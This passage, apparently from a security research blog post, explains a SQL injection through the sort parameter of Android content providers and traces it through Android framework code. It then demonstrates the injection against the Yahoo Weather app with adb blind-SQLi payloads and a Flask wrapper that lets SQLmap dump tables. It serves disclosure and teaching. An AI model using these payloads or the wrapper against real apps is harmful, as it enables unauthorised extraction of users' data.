+<span class="mi">172</span>            <span class="k">default</span><span class="o">:</span>
+<span class="mi">173</span>                <span class="k">throw</span> <span class="k">new</span> <span class="n">UnsupportedOperationException</span><span class="o">(</span><span class="s">"Unsupported Uri "</span> <span class="o">+</span> <span class="n">uri</span><span class="o">);</span>
+<span class="mi">174</span>        <span class="o">}</span>
+<span class="mi">175</span>    <span class="o">}</span>
+</pre></div>
+<p>Basically the method is passing the sort parameter directly to the SQLiteDatabase query method. This pattern is really 
+really common, that you can find it even in the Google <code>IOSCHED</code> sample app (see <a href="https://github.com/google/iosched/blob/master/android/src/main/java/com/google/samples/apps/iosched/provider/ScheduleProvider.java">https://github.com/google/iosched/blob/master/android/src/main/java/com/google/samples/apps/iosched/provider/ScheduleProvider.java</a>):</p>
+<div class="highlight"><pre><span></span>    <span class="cm">/** {@inheritDoc} */</span>
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="n">Cursor</span> <span class="nf">query</span><span class="o">(</span><span class="n">Uri</span> <span class="n">uri</span><span class="o">,</span> <span class="n">String</span><span class="o">[]</span> <span class="n">projection</span><span class="o">,</span> <span class="n">String</span> <span class="n">selection</span><span class="o">,</span> <span class="n">String</span><span class="o">[]</span> <span class="n">selectionArgs</span><span class="o">,</span>
+                        <span class="n">String</span> <span class="n">sortOrder</span><span class="o">)</span> <span class="o">{</span>
+        <span class="kd">final</span> <span class="n">SQLiteDatabase</span> <span class="n">db</span> <span class="o">=</span> <span class="n">mOpenHelper</span><span class="o">.</span><span class="na">getReadableDatabase</span><span class="o">();</span>
+
+        <span class="n">String</span> <span class="n">tagsFilter</span> <span class="o">=</span> <span class="n">uri</span><span class="o">.</span><span class="na">getQueryParameter</span><span class="o">(</span><span class="n">Sessions</span><span class="o">.</span><span class="na">QUERY_PARAMETER_TAG_FILTER</span><span class="o">);</span>
+        <span class="n">String</span> <span class="n">categories</span> <span class="o">=</span> <span class="n">uri</span><span class="o">.</span><span class="na">getQueryParameter</span><span class="o">(</span><span class="n">Sessions</span><span class="o">.</span><span class="na">QUERY_PARAMETER_CATEGORIES</span><span class="o">);</span>
+
+
+
+        <span class="n">ScheduleUriEnum</span> <span class="n">matchingUriEnum</span> <span class="o">=</span> <span class="n">mUriMatcher</span><span class="o">.</span><span class="na">matchUri</span><span class="o">(</span><span class="n">uri</span><span class="o">);</span>
+
+        <span class="c1">// Avoid the expensive string concatenation below if not loggable.</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">Log</span><span class="o">.</span><span class="na">isLoggable</span><span class="o">(</span><span class="n">TAG</span><span class="o">,</span> <span class="n">Log</span><span class="o">.</span><span class="na">VERBOSE</span><span class="o">))</span> <span class="o">{</span>
+            <span class="n">Log</span><span class="o">.</span><span class="na">v</span><span class="o">(</span><span class="n">TAG</span><span class="o">,</span> <span class="s">"uri="</span> <span class="o">+</span> <span class="n">uri</span> <span class="o">+</span> <span class="s">" code="</span> <span class="o">+</span> <span class="n">matchingUriEnum</span><span class="o">.</span><span class="na">code</span> <span class="o">+</span> <span class="s">" proj="</span> <span class="o">+</span>
+                    <span class="n">Arrays</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">projection</span><span class="o">)</span> <span class="o">+</span> <span class="s">" selection="</span> <span class="o">+</span> <span class="n">selection</span> <span class="o">+</span> <span class="s">" args="</span>
+                    <span class="o">+</span> <span class="n">Arrays</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">selectionArgs</span><span class="o">)</span> <span class="o">+</span> <span class="s">")"</span><span class="o">);</span>
+        <span class="o">}</span>
+
+        <span class="k">switch</span> <span class="o">(</span><span class="n">matchingUriEnum</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">default</span><span class="o">:</span> <span class="o">{</span>
+                <span class="c1">// Most cases are handled with simple SelectionBuilder.</span>
+                <span class="kd">final</span> <span class="n">SelectionBuilder</span> <span class="n">builder</span> <span class="o">=</span> <span class="n">buildExpandedSelection</span><span class="o">(</span><span class="n">uri</span><span class="o">,</span> <span class="n">matchingUriEnum</span><span class="o">.</span><span class="na">code</span><span class="o">);</span>
+
+                <span class="c1">// If a special filter was specified, try to apply it.</span>
+                <span class="k">if</span> <span class="o">(!</span><span class="n">TextUtils</span><span class="o">.</span><span class="na">isEmpty</span><span class="o">(</span><span class="n">tagsFilter</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">TextUtils</span><span class="o">.</span><span class="na">isEmpty</span><span class="o">(</span><span class="n">categories</span><span class="o">))</span> <span class="o">{</span>
+                    <span class="n">addTagsFilter</span><span class="o">(</span><span class="n">builder</span><span class="o">,</span> <span class="n">tagsFilter</span><span class="o">,</span> <span class="n">categories</span><span class="o">);</span>
+                <span class="o">}</span>
+
+                <span class="kt">boolean</span> <span class="n">distinct</span> <span class="o">=</span> <span class="n">ScheduleContractHelper</span><span class="o">.</span><span class="na">isQueryDistinct</span><span class="o">(</span><span class="n">uri</span><span class="o">);</span>
+
+
+                <span class="n">Cursor</span> <span class="n">cursor</span> <span class="o">=</span> <span class="n">builder</span>
+                        <span class="o">.</span><span class="na">where</span><span class="o">(</span><span class="n">selection</span><span class="o">,</span> <span class="n">selectionArgs</span><span class="o">)</span>
+                        <span class="o">.</span><span class="na">query</span><span class="o">(</span><span class="n">db</span><span class="o">,</span> <span class="n">distinct</span><span class="o">,</span> <span class="n">projection</span><span class="o">,</span> <span class="n">sortOrder</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+
+
+                <span class="n">Context</span> <span class="n">context</span> <span class="o">=</span> <span class="n">getContext</span><span class="o">();</span>
+                <span class="k">if</span> <span class="o">(</span><span class="kc">null</span> <span class="o">!=</span> <span class="n">context</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="n">cursor</span><span class="o">.</span><span class="na">setNotificationUri</span><span class="o">(</span><span class="n">context</span><span class="o">.</span><span class="na">getContentResolver</span><span class="o">(),</span> <span class="n">uri</span><span class="o">);</span>
+                <span class="o">}</span>
+                <span class="k">return</span> <span class="n">cursor</span><span class="o">;</span>
+            <span class="o">}</span>
+            <span class="k">case</span> <span class="n">SEARCH_SUGGEST</span><span class="o">:</span> <span class="o">{</span>
+                <span class="kd">final</span> <span class="n">SelectionBuilder</span> <span class="n">builder</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SelectionBuilder</span><span class="o">();</span>
+
+                <span class="c1">// Adjust incoming query to become SQL text match.</span>
+                <span class="n">selectionArgs</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">=</span> <span class="n">selectionArgs</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">+</span> <span class="s">"%"</span><span class="o">;</span>
+                <span class="n">builder</span><span class="o">.</span><span class="na">table</span><span class="o">(</span><span class="n">Tables</span><span class="o">.</span><span class="na">SEARCH_SUGGEST</span><span class="o">);</span>
+                <span class="n">builder</span><span class="o">.</span><span class="na">where</span><span class="o">(</span><span class="n">selection</span><span class="o">,</span> <span class="n">selectionArgs</span><span class="o">);</span>
+                <span class="n">builder</span><span class="o">.</span><span class="na">map</span><span class="o">(</span><span class="n">SearchManager</span><span class="o">.</span><span class="na">SUGGEST_COLUMN_QUERY</span><span class="o">,</span>
+                        <span class="n">SearchManager</span><span class="o">.</span><span class="na">SUGGEST_COLUMN_TEXT_1</span><span class="o">);</span>
+                <span class="n">projection</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span>
+                        <span class="n">BaseColumns</span><span class="o">.</span><span class="na">_ID</span><span class="o">,</span>
+                        <span class="n">SearchManager</span><span class="o">.</span><span class="na">SUGGEST_COLUMN_TEXT_1</span><span class="o">,</span>
+                        <span class="n">SearchManager</span><span class="o">.</span><span class="na">SUGGEST_COLUMN_QUERY</span>
+                <span class="o">};</span>
+
+                <span class="kd">final</span> <span class="n">String</span> <span class="n">limit</span> <span class="o">=</span> <span class="n">uri</span><span class="o">.</span><span class="na">getQueryParameter</span><span class="o">(</span><span class="n">SearchManager</span><span class="o">.</span><span class="na">SUGGEST_PARAMETER_LIMIT</span><span class="o">);</span>
+                <span class="k">return</span> <span class="n">builder</span><span class="o">.</span><span class="na">query</span><span class="o">(</span><span class="n">db</span><span class="o">,</span> <span class="kc">false</span><span class="o">,</span> <span class="n">projection</span><span class="o">,</span> <span class="n">SearchSuggest</span><span class="o">.</span><span class="na">DEFAULT_SORT</span><span class="o">,</span> <span class="n">limit</span><span class="o">);</span>
+            <span class="o">}</span>
+            <span class="k">case</span> <span class="n">SEARCH_TOPICS_SESSIONS</span><span class="o">:</span> <span class="o">{</span>
+                <span class="k">if</span> <span class="o">(</span><span class="n">selectionArgs</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="n">selectionArgs</span><span class="o">.</span><span class="na">length</span> <span class="o">==</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="k">return</span> <span class="n">createMergedSearchCursor</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+                <span class="o">}</span>
+                <span class="n">String</span> <span class="n">selectionArg</span> <span class="o">=</span> <span class="n">selectionArgs</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">?</span> <span class="s">""</span> <span class="o">:</span> <span class="n">selectionArgs</span><span class="o">[</span><span class="mi">0</span><span class="o">];</span>
+                <span class="c1">// First we query the Tags table to find any tags that match the given query</span>
+                <span class="n">Cursor</span> <span class="n">tags</span> <span class="o">=</span> <span class="n">query</span><span class="o">(</span><span class="n">Tags</span><span class="o">.</span><span class="na">CONTENT_URI</span><span class="o">,</span> <span class="n">SearchTopicsSessions</span><span class="o">.</span><span class="na">TOPIC_TAG_PROJECTION</span><span class="o">,</span>
+                        <span class="n">SearchTopicsSessions</span><span class="o">.</span><span class="na">TOPIC_TAG_SELECTION</span><span class="o">,</span>
+                        <span class="k">new</span> <span class="n">String</span><span class="o">[]</span> <span class="o">{</span><span class="n">Config</span><span class="o">.</span><span class="na">Tags</span><span class="o">.</span><span class="na">CATEGORY_TOPIC</span><span class="o">,</span> <span class="n">selectionArg</span> <span class="o">+</span> <span class="s">"%"</span><span class="o">},</span>
+                        <span class="n">Tags</span><span class="o">.</span><span class="na">TAG_ORDER_BY_CATEGORY</span><span class="o">);</span>
+                <span class="c1">// Then we query the sessions_search table and get a list of sessions that match</span>
+                <span class="c1">// the given keywords.</span>
+                <span class="n">Cursor</span> <span class="n">search</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+                <span class="k">if</span> <span class="o">(</span><span class="n">selectionArgs</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span> <span class="c1">// dont query if there was no selectionArg.</span>
+                    <span class="n">search</span> <span class="o">=</span> <span class="n">query</span><span class="o">(</span><span class="n">ScheduleContract</span><span class="o">.</span><span class="na">Sessions</span><span class="o">.</span><span class="na">buildSearchUri</span><span class="o">(</span><span class="n">selectionArg</span><span class="o">),</span>
+                            <span class="n">SearchTopicsSessions</span><span class="o">.</span><span class="na">SEARCH_SESSIONS_PROJECTION</span><span class="o">,</span>
+                            <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span>
+                            <span class="n">ScheduleContract</span><span class="o">.</span><span class="na">Sessions</span><span class="o">.</span><span class="na">SORT_BY_TYPE_THEN_TIME</span><span class="o">);</span>
+                <span class="o">}</span>
+                <span class="c1">// Now that we have two cursors, we merge the cursors and return a unified view</span>
+                <span class="c1">// of the two result sets.</span>
+                <span class="k">return</span> <span class="n">createMergedSearchCursor</span><span class="o">(</span><span class="n">tags</span><span class="o">,</span> <span class="n">search</span><span class="o">);</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+</pre></div>
+<p>Digging a little bit into the API we can find this:</p>
+<div class="highlight"><pre><span></span><span class="n">Class</span> <span class="n">android</span><span class="o">.</span><span class="na">database</span><span class="o">.</span><span class="na">sqlite</span><span class="o">.</span><span class="na">SQLiteDatabase</span>
+
+<span class="mi">1196</span>    <span class="kd">public</span> <span class="n">Cursor</span> <span class="nf">query</span><span class="o">(</span><span class="n">String</span> <span class="n">table</span><span class="o">,</span> <span class="n">String</span><span class="o">[]</span> <span class="n">columns</span><span class="o">,</span> <span class="n">String</span> <span class="n">selection</span><span class="o">,</span>
+<span class="mi">1197</span>            <span class="n">String</span><span class="o">[]</span> <span class="n">selectionArgs</span><span class="o">,</span> <span class="n">String</span> <span class="n">groupBy</span><span class="o">,</span> <span class="n">String</span> <span class="n">having</span><span class="o">,</span>
+<span class="mi">1198</span>            <span class="n">String</span> <span class="n">orderBy</span><span class="o">)</span> <span class="o">{</span>
+<span class="mi">1199</span>
+<span class="mi">1200</span>        <span class="k">return</span> <span class="n">query</span><span class="o">(</span><span class="kc">false</span><span class="o">,</span> <span class="n">table</span><span class="o">,</span> <span class="n">columns</span><span class="o">,</span> <span class="n">selection</span><span class="o">,</span> <span class="n">selectionArgs</span><span class="o">,</span> <span class="n">groupBy</span><span class="o">,</span>
+<span class="mi">1201</span>                <span class="n">having</span><span class="o">,</span> <span class="n">orderBy</span><span class="o">,</span> <span class="kc">null</span> <span class="cm">/* limit */</span><span class="o">);</span>
+<span class="mi">1202</span>    <span class="o">}</span>
+
+<span class="o">...</span>
+
+<span class="mi">1029</span>    <span class="kd">public</span> <span class="n">Cursor</span> <span class="nf">query</span><span class="o">(</span><span class="kt">boolean</span> <span class="n">distinct</span><span class="o">,</span> <span class="n">String</span> <span class="n">table</span><span class="o">,</span> <span class="n">String</span><span class="o">[]</span> <span class="n">columns</span><span class="o">,</span>
+<span class="mi">1030</span>            <span class="n">String</span> <span class="n">selection</span><span class="o">,</span> <span class="n">String</span><span class="o">[]</span> <span class="n">selectionArgs</span><span class="o">,</span> <span class="n">String</span> <span class="n">groupBy</span><span class="o">,</span>
+<span class="mi">1031</span>            <span class="n">String</span> <span class="n">having</span><span class="o">,</span> <span class="n">String</span> <span class="n">orderBy</span><span class="o">,</span> <span class="n">String</span> <span class="n">limit</span><span class="o">)</span> <span class="o">{</span>
+<span class="mi">1032</span>        <span class="k">return</span> <span class="n">queryWithFactory</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="n">distinct</span><span class="o">,</span> <span class="n">table</span><span class="o">,</span> <span class="n">columns</span><span class="o">,</span> <span class="n">selection</span><span class="o">,</span> <span class="n">selectionArgs</span><span class="o">,</span>
+<span class="mi">1033</span>                <span class="n">groupBy</span><span class="o">,</span> <span class="n">having</span><span class="o">,</span> <span class="n">orderBy</span><span class="o">,</span> <span class="n">limit</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+<span class="mi">1034</span>    <span class="o">}</span>
+
+<span class="o">...</span>
+
+<span class="mi">1152</span>    <span class="kd">public</span> <span class="n">Cursor</span> <span class="nf">queryWithFactory</span><span class="o">(</span><span class="n">CursorFactory</span> <span class="n">cursorFactory</span><span class="o">,</span>
+<span class="mi">1153</span>            <span class="kt">boolean</span> <span class="n">distinct</span><span class="o">,</span> <span class="n">String</span> <span class="n">table</span><span class="o">,</span> <span class="n">String</span><span class="o">[]</span> <span class="n">columns</span><span class="o">,</span>
+<span class="mi">1154</span>            <span class="n">String</span> <span class="n">selection</span><span class="o">,</span> <span class="n">String</span><span class="o">[]</span> <span class="n">selectionArgs</span><span class="o">,</span> <span class="n">String</span> <span class="n">groupBy</span><span class="o">,</span>
+<span class="mi">1155</span>            <span class="n">String</span> <span class="n">having</span><span class="o">,</span> <span class="n">String</span> <span class="n">orderBy</span><span class="o">,</span> <span class="n">String</span> <span class="n">limit</span><span class="o">,</span> <span class="n">CancellationSignal</span> <span class="n">cancellationSignal</span><span class="o">)</span> <span class="o">{</span>
+<span class="mi">1156</span>        <span class="n">acquireReference</span><span class="o">();</span>
+<span class="mi">1157</span>        <span class="k">try</span> <span class="o">{</span>
+<span class="mi">1158</span>            <span class="n">String</span> <span class="n">sql</span> <span class="o">=</span> <span class="n">SQLiteQueryBuilder</span><span class="o">.</span><span class="na">buildQueryString</span><span class="o">(</span>
+<span class="mi">1159</span>                    <span class="n">distinct</span><span class="o">,</span> <span class="n">table</span><span class="o">,</span> <span class="n">columns</span><span class="o">,</span> <span class="n">selection</span><span class="o">,</span> <span class="n">groupBy</span><span class="o">,</span> <span class="n">having</span><span class="o">,</span> <span class="n">orderBy</span><span class="o">,</span> <span class="n">limit</span><span class="o">);</span>
+<span class="mi">1160</span>
+<span class="mi">1161</span>            <span class="k">return</span> <span class="n">rawQueryWithFactory</span><span class="o">(</span><span class="n">cursorFactory</span><span class="o">,</span> <span class="n">sql</span><span class="o">,</span> <span class="n">selectionArgs</span><span class="o">,</span>
+<span class="mi">1162</span>                    <span class="n">findEditTable</span><span class="o">(</span><span class="n">table</span><span class="o">),</span> <span class="n">cancellationSignal</span><span class="o">);</span>
+<span class="mi">1163</span>        <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
+<span class="mi">1164</span>            <span class="n">releaseReference</span><span class="o">();</span>
+<span class="mi">1165</span>        <span class="o">}</span>
+<span class="mi">1166</span>    <span class="o">}</span>
+
+
+
+<span class="n">Class</span> <span class="n">android</span><span class="o">.</span><span class="na">database</span><span class="o">.</span><span class="na">sqlite</span><span class="o">.</span><span class="na">SQLiteQueryBuilder</span>
+
+<span class="mi">201</span>    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">buildQueryString</span><span class="o">(</span>
+<span class="mi">202</span>            <span class="kt">boolean</span> <span class="n">distinct</span><span class="o">,</span> <span class="n">String</span> <span class="n">tables</span><span class="o">,</span> <span class="n">String</span><span class="o">[]</span> <span class="n">columns</span><span class="o">,</span> <span class="n">String</span> <span class="n">where</span><span class="o">,</span>
+<span class="mi">203</span>            <span class="n">String</span> <span class="n">groupBy</span><span class="o">,</span> <span class="n">String</span> <span class="n">having</span><span class="o">,</span> <span class="n">String</span> <span class="n">orderBy</span><span class="o">,</span> <span class="n">String</span> <span class="n">limit</span><span class="o">)</span> <span class="o">{</span>
+<span class="mi">204</span>        <span class="k">if</span> <span class="o">(</span><span class="n">TextUtils</span><span class="o">.</span><span class="na">isEmpty</span><span class="o">(</span><span class="n">groupBy</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">TextUtils</span><span class="o">.</span><span class="na">isEmpty</span><span class="o">(</span><span class="n">having</span><span class="o">))</span> <span class="o">{</span>
+<span class="mi">205</span>            <span class="k">throw</span> <span class="k">new</span> <span class="n">IllegalArgumentException</span><span class="o">(</span>
+<span class="mi">206</span>                    <span class="s">"HAVING clauses are only permitted when using a groupBy clause"</span><span class="o">);</span>
+<span class="mi">207</span>        <span class="o">}</span>
+<span class="mi">208</span>        <span class="k">if</span> <span class="o">(!</span><span class="n">TextUtils</span><span class="o">.</span><span class="na">isEmpty</span><span class="o">(</span><span class="n">limit</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">sLimitPattern</span><span class="o">.</span><span class="na">matcher</span><span class="o">(</span><span class="n">limit</span><span class="o">).</span><span class="na">matches</span><span class="o">())</span> <span class="o">{</span>
+<span class="mi">209</span>            <span class="k">throw</span> <span class="k">new</span> <span class="n">IllegalArgumentException</span><span class="o">(</span><span class="s">"invalid LIMIT clauses:"</span> <span class="o">+</span> <span class="n">limit</span><span class="o">);</span>
+<span class="mi">210</span>        <span class="o">}</span>
+<span class="mi">211</span>
+<span class="mi">212</span>        <span class="n">StringBuilder</span> <span class="n">query</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="o">(</span><span class="mi">120</span><span class="o">);</span>
+<span class="mi">213</span>
+<span class="mi">214</span>        <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"SELECT "</span><span class="o">);</span>
+<span class="mi">215</span>        <span class="k">if</span> <span class="o">(</span><span class="n">distinct</span><span class="o">)</span> <span class="o">{</span>
+<span class="mi">216</span>            <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"DISTINCT "</span><span class="o">);</span>
+<span class="mi">217</span>        <span class="o">}</span>
+<span class="mi">218</span>        <span class="k">if</span> <span class="o">(</span><span class="n">columns</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">columns</span><span class="o">.</span><span class="na">length</span> <span class="o">!=</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
+<span class="mi">219</span>            <span class="n">appendColumns</span><span class="o">(</span><span class="n">query</span><span class="o">,</span> <span class="n">columns</span><span class="o">);</span>
+<span class="mi">220</span>        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+<span class="mi">221</span>            <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"* "</span><span class="o">);</span>
+<span class="mi">222</span>        <span class="o">}</span>
+<span class="mi">223</span>        <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"FROM "</span><span class="o">);</span>
+<span class="mi">224</span>        <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">tables</span><span class="o">);</span>
+<span class="mi">225</span>        <span class="n">appendClause</span><span class="o">(</span><span class="n">query</span><span class="o">,</span> <span class="s">" WHERE "</span><span class="o">,</span> <span class="n">where</span><span class="o">);</span>
+<span class="mi">226</span>        <span class="n">appendClause</span><span class="o">(</span><span class="n">query</span><span class="o">,</span> <span class="s">" GROUP BY "</span><span class="o">,</span> <span class="n">groupBy</span><span class="o">);</span>
+<span class="mi">227</span>        <span class="n">appendClause</span><span class="o">(</span><span class="n">query</span><span class="o">,</span> <span class="s">" HAVING "</span><span class="o">,</span> <span class="n">having</span><span class="o">);</span>
+<span class="mi">228</span>        <span class="n">appendClause</span><span class="o">(</span><span class="n">query</span><span class="o">,</span> <span class="s">" ORDER BY "</span><span class="o">,</span> <span class="n">orderBy</span><span class="o">);</span>
+<span class="mi">229</span>        <span class="n">appendClause</span><span class="o">(</span><span class="n">query</span><span class="o">,</span> <span class="s">" LIMIT "</span><span class="o">,</span> <span class="n">limit</span><span class="o">);</span>
+<span class="mi">230</span>
+<span class="mi">231</span>        <span class="k">return</span> <span class="n">query</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
+<span class="mi">232</span>    <span class="o">}</span>
+<span class="mi">233</span>
+<span class="mi">234</span>    <span class="kd">private</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">appendClause</span><span class="o">(</span><span class="n">StringBuilder</span> <span class="n">s</span><span class="o">,</span> <span class="n">String</span> <span class="n">name</span><span class="o">,</span> <span class="n">String</span> <span class="n">clause</span><span class="o">)</span> <span class="o">{</span>
+<span class="mi">235</span>        <span class="k">if</span> <span class="o">(!</span><span class="n">TextUtils</span><span class="o">.</span><span class="na">isEmpty</span><span class="o">(</span><span class="n">clause</span><span class="o">))</span> <span class="o">{</span>
+<span class="mi">236</span>            <span class="n">s</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
+<span class="mi">237</span>            <span class="n">s</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">clause</span><span class="o">);</span>
+<span class="mi">238</span>        <span class="o">}</span>
+<span class="mi">239</span>    <span class="o">}</span>
+</pre></div>
+<p>Basically the sort parameter is simply passed from one method to another and then simply concatenated (in 
+<code>appendClause</code> method) to the request hence leading to a very basic SQL injection.</p>
+<p>Demonstrating exploitability is simple using a blind SQLi technique (two test with the first <code>1=1</code> and the second <code>1=2</code>
+ exhibiting different behavior):</p>
+<div class="highlight"><pre><span></span>&gt; $ adb shell content query --uri content://com.yahoo.mobile.client.android.weather.provider.Weather/locations/ --sort <span class="s1">'_id/**/limit/**/\(select/**/1/**/from/**/sqlite_master/**/where/**/1=1\)'</span>                   
+Row: <span class="m">0</span> <span class="nv">_id</span><span class="o">=</span><span class="m">1</span>, <span class="nv">woeid</span><span class="o">=</span><span class="m">2487956</span>, <span class="nv">isCurrentLocation</span><span class="o">=</span><span class="m">0</span>, <span class="nv">latitude</span><span class="o">=</span>NULL, <span class="nv">longitude</span><span class="o">=</span>NULL, <span class="nv">photoWoeid</span><span class="o">=</span>NULL, <span class="nv">city</span><span class="o">=</span>NULL, <span class="nv">state</span><span class="o">=</span>NULL, <span class="nv">stateAbbr</span><span class="o">=</span>, <span class="nv">country</span><span class="o">=</span>NULL, <span class="nv">countryAbbr</span><span class="o">=</span>, <span class="nv">timeZoneId</span><span class="o">=</span>NULL, <span class="nv">timeZoneAbbr</span><span class="o">=</span>NULL, <span class="nv">lastUpdatedTimeMillis</span><span class="o">=</span><span class="m">746034814</span>, <span class="nv">crc</span><span class="o">=</span><span class="m">1591594725</span>
+
+&gt; $ adb shell content query --uri content://com.yahoo.mobile.client.android.weather.provider.Weather/locations/ --sort <span class="s1">'_id/**/limit/**/\(select/**/1/**/from/**/sqlite_master/**/where/**/1=2\)'</span>                   
+Error <span class="k">while</span> accessing provider:com.yahoo.mobile.client.android.weather.provider.Weather
+android.database.sqlite.SQLiteException: datatype mismatch <span class="o">(</span>code <span class="m">20</span><span class="o">)</span>
+at android.database.DatabaseUtils.readExceptionFromParcel<span class="o">(</span>DatabaseUtils.java:181<span class="o">)</span>
+at android.database.DatabaseUtils.readExceptionFromParcel<span class="o">(</span>DatabaseUtils.java:137<span class="o">)</span>
+at android.content.ContentProviderProxy.query<span class="o">(</span>ContentProviderNative.java:366<span class="o">)</span>
+at com.android.commands.content.Content<span class="nv">$QueryCommand</span>.onExecute<span class="o">(</span>Content.java:392<span class="o">)</span>
+at com.android.commands.content.Content<span class="nv">$Command</span>.execute<span class="o">(</span>Content.java:336<span class="o">)</span>
+at com.android.commands.content.Content.main<span class="o">(</span>Content.java:462<span class="o">)</span>
+at com.android.internal.os.RuntimeInit.nativeFinishInit<span class="o">(</span>Native Method<span class="o">)</span>
+</pre></div>
+<p>To really demonstrate the exploitability of the SQli and as we already have the magnificent SQLmap, here is a dirty 
+hack to use SQLmap on the content provider by simulating a web page (we know it is dirty but it proves the point):</p>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span>
+
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+
+<span class="n">URI</span> <span class="o">=</span> <span class="s2">"com.yahoo.mobile.client.android.weather.provider.Weather/locations/"</span>
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="s2">"/"</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">hello</span><span class="p">():</span>
+
+   <span class="n">method</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">values</span><span class="p">[</span><span class="s1">'method'</span><span class="p">]</span>
+   <span class="n">sort</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">values</span><span class="p">[</span><span class="s1">'sort'</span><span class="p">]</span>
+   <span class="n">sort</span> <span class="o">=</span> <span class="s2">"_id/**/limit/**/(SELECT/**/1/**/FROM/**/sqlite_master/**/WHERE/**/1={})"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sort</span><span class="p">)</span>
+   <span class="c1">#sort = "_id/**/limit/**/({})".format(sort)</span>
+
+   <span class="n">p</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">([</span><span class="s2">"adb"</span><span class="p">,</span><span class="s2">"shell"</span><span class="p">,</span><span class="s2">"content"</span><span class="p">,</span><span class="n">method</span><span class="p">,</span><span class="s2">"--uri"</span><span class="p">,</span><span class="s2">"content://{}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">URI</span><span class="p">),</span><span class="s2">"--sort"</span><span class="p">,</span><span class="s1">'"{}"'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sort</span><span class="p">)],</span><span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span><span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">STDOUT</span><span class="p">)</span>
+
+   <span class="n">o</span><span class="p">,</span> <span class="n">e</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">communicate</span><span class="p">()</span>
+
+   <span class="k">print</span> <span class="s2">"[*]SORT:{}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sort</span><span class="p">)</span>
+   <span class="k">print</span> <span class="s2">"[*]OUTPUT:{}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">o</span><span class="p">)</span>
+   <span class="k">return</span> <span class="s2">"&lt;html&gt;&lt;divclass='output'&gt;{}&lt;/div&gt;&lt;/html&gt;"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">o</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span><span class="s2">"__main__"</span><span class="p">:</span>
+   <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
+</pre></div>
+<p>Launching SQLmap rapidly confirms the SQL injection and starts dumping the tables:</p>
+<p><img alt="alt text" class="img-fluid" src="/static/img/android_sql_contentprovider_sql_injections/sqlmap.jpg" title="sql_map"/></p>
+<p>There seems to be a bug in SQLmap guessing the first character of the table name, but we didn't investigate more to 
+pinpoint the source of the issue. Appending the sort parameter with 
